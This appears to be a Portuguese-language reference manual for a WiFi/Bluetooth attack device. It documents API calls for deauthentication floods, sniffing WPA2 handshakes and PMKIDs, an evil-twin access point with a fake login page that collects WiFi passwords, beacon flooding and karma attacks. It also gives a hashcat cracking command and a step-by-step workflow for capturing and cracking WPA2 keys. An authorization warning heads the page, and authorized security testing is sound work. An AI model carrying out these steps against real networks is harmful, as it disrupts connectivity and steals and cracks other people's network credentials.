# Guia de Ataques / Attack Reference

> ⚠️ **USE SOMENTE EM REDES E DISPOSITIVOS QUE VOCÊ POSSUI OU TEM AUTORIZAÇÃO EXPLÍCITA PARA TESTAR.**

---

## 1. WiFi Scanner

Varre redes 802.11 próximas e exibe SSID, BSSID, canal, RSSI e tipo de autenticação.

**API:**
```
GET /api/wifi/scan
GET /api/wifi/clients
```

---

## 2. Deauth Attack (Desautenticação 802.11)

Envia frames de deautenticação/disassociação forjados para desconectar clientes de um AP.

**Modo broadcast:** desconecta todos os clientes do AP.  
**Modo targeted:** desconecta um cliente específico.

Usa 6 reason codes diferentes por ciclo e envia em ambas as direções (AP→Client e Client→AP).

**API:**
```json
POST /api/deauth/start
{ "bssid": "AA:BB:CC:DD:EE:FF", "client": "FF:FF:FF:FF:FF:FF", "channel": 6 }

POST /api/deauth/stop
```

**Auto-Capture:** ao ativar com `"autoCapture": true`, o sniffer é ativado no canal do alvo automaticamente para capturar o handshake WPA2 provocado pela reconexão.

---

## 3. Packet Sniffer

Modo promíscuo captura todos os frames 802.11 no ar. Faz channel hopping automático (200ms por canal, canais 1–13).

Detecta e armazena:
- **Probe Requests** — dispositivos buscando redes conhecidas
- **EAPOL Handshakes** — troca de chaves WPA2 (M1/M2/M3/M4)
- **PMKID** — hash extraível para cracking offline (hashcat modo 22000)

**API:**
```
POST /api/sniffer/start
POST /api/sniffer/stop
POST /api/sniffer/channel   { "channel": 6 }
POST /api/sniffer/hop
GET  /api/sniffer/handshakes
GET  /api/sniffer/pmkids
GET  /api/sniffer/probes
```

**Cracking PMKID com hashcat:**
```bash
hashcat -m 22000 pmkid.hash wordlist.txt
```

---

## 4. Evil Twin (AP Clone + Captive Portal)

Cria um AP aberto com o mesmo SSID do alvo. Usuários que se conectam são redirecionados para uma página de login falsa que coleta a senha WiFi.

**API:**
```json
POST /api/eviltwin/start
{ "ssid": "NomeDaRede", "channel": 6 }

POST /api/eviltwin/stop
GET  /api/eviltwin/creds
```

---

## 5. Beacon Flood

Transmite beacons 802.11 com múltiplos SSIDs falsos, "enchendo" a lista de redes WiFi de dispositivos próximos.

**API:**
```json
POST /api/beacon/start
{ "ssids": ["FreeWiFi", "McDonalds", "Airport_Guest"], "channel": 6 }

POST /api/beacon/stop
```

---

## 6. Karma Attack

Responde a qualquer Probe Request com um Probe Response forjado, fazendo o dispositivo acreditar que a rede que procura está disponível. Combinado com Evil Twin força conexões automáticas.

**API:**
```
POST /api/karma/start
POST /api/karma/stop
GET  /api/karma/responded
```

---

## 7. BLE Scanner & Enumerate

Varre dispositivos BLE próximos (modo ativo) e pode conectar para enumerar serviços e características GATT.

**API:**
```json
POST /api/ble/scan        { "seconds": 10 }
POST /api/ble/enumerate   { "addr": "AA:BB:CC:DD:EE:FF" }
```

---

## 8. Segundo Rádio (ESP8266)

Controla um módulo ESP8266 via UART2 com comandos AT para scanner WiFi independente.

**API:**
```
GET /api/radio2/status
GET /api/radio2/scan
```

---

## Fluxo de ataque típico (captura WPA2)

```
1. Scanner WiFi → identificar alvo (SSID, BSSID, canal)
2. Sniffer → start, fixar canal do alvo
3. Deauth → broadcast no canal do alvo (força reconexão)
4. Aguardar EAPOL M1/M2 no sniffer
5. Exportar PMKID → cracking offline com hashcat
```
